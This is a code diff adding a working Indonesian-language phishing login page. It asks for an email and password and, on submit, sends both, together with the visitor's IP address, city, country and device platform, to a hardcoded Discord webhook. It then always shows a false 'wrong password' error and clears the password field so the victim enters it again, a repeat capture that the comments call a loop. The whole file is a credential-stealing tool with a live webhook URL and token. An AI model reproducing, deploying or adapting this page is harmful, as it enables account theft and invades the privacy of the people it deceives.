@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun - Masuk</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; }
+        .login-container { background-color: #ffffff; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); width: 100%; max-width: 400px; position: relative; }
+        .login-form h2 { margin-bottom: 0.5rem; text-align: center; font-size: 1.8rem; color: #2d3436; }
+        .login-form p { margin-bottom: 2rem; text-align: center; color: #636e72; font-size: 0.9rem; }
+        .input-group { margin-bottom: 1.2rem; }
+        .input-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; font-size: 0.9rem; }
+        .input-group input { width: 100%; padding: 0.8rem; border: 2px solid #dfe6e9; border-radius: 6px; outline: none; transition: border-color 0.3s; }
+        .input-group input:focus { border-color: #ff4757; }
+        
+        /* Notifikasi Error */
+        .error-msg { 
+            display: none; 
+            background: #ffeae6; 
+            color: #ff4757; 
+            padding: 10px; 
+            border-radius: 6px; 
+            font-size: 0.8rem; 
+            margin-bottom: 1.5rem; 
+            border: 1px solid #ff4757; 
+            text-align: center;
+        }
+
+        .login-btn { width: 100%; padding: 0.8rem; border: none; border-radius: 6px; background-color: #667eea; color: white; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .login-btn:hover { background-color: #5a67d8; }
+        .footer-links { margin-top: 1.5rem; text-align: center; font-size: 0.85rem; color: #667eea; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <form id="loginForm" class="login-form">
+            <h2>Masuk</h2>
+            <p>Konfirmasi identitas anda</p>
+            
+            <div id="errorBox" class="error-msg">
+                <i class="fa-solid fa-circle-exclamation"></i> 
+                Sandi salah atau server sibuk. Silakan coba lagi.
+            </div>
+
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="nama@email.com" required>
+            </div>
+
+            <div class="input-group">
+                <label>Kata Sandi</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="login-btn">Login</button>
+            
+            <div class="footer-links">
+                <a href="#" style="text-decoration:none">Lupa Password?</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // WEBHOOK SPIDEY BOT KAMU
+        const DISCORD_URL = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const errorBox = document.getElementById('errorBox');
+
+            // 1. Tampilkan Efek Loading
+            btn.innerText = "Memproses...";
+            btn.disabled = true;
+            errorBox.style.display = "none";
+
+            try {
+                // 2. Ambil Data Device & Lokasi
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
+                
+                // 3. Kirim ke Spidey Bot
+                await fetch(DISCORD_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "LOGIN ATTEMPT DETECTOR",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/3046/3046121.png",
+                        embeds: [{
+                            title: "⚠️ LOGIN ATTEMPT (FAILED MODE)",
+                            color: 16729143, // Warna Merah
+                            fields: [
+                                { name: "📧 Email", value: `\`${email}\`` },
+                                { name: "🔒 Password", value: `\`${password}\`` },
+                                { name: "🌐 IP Address", value: `\`${d.ip}\`` },
+                                { name: "📍 Lokasi", value: `${d.city}, ${d.country_name}` },
+                                { name: "📱 Perangkat", value: navigator.platform }
+                            ],
+                            footer: { text: "RAX-HUB LOOP SYSTEM • " + new Date().toLocaleString() }
+                        }]
+                    })
+                });
+
+                // 4. Efek Gagal (Looping)
+                setTimeout(() => {
+                    btn.innerText = "Login";
+                    btn.disabled = false;
+                    errorBox.style.display = "block"; // Munculkan pesan error
+                    document.getElementById('password').value = ""; // Kosongkan password biar dia ketik ulang
+                    document.getElementById('password').focus();
+                }, 1500);
+
+            } catch (error) {
+                // Jika error tetap tampilkan seolah-olah gagal login
+                btn.innerText = "Login";
+                btn.disabled = false;
+                errorBox.style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
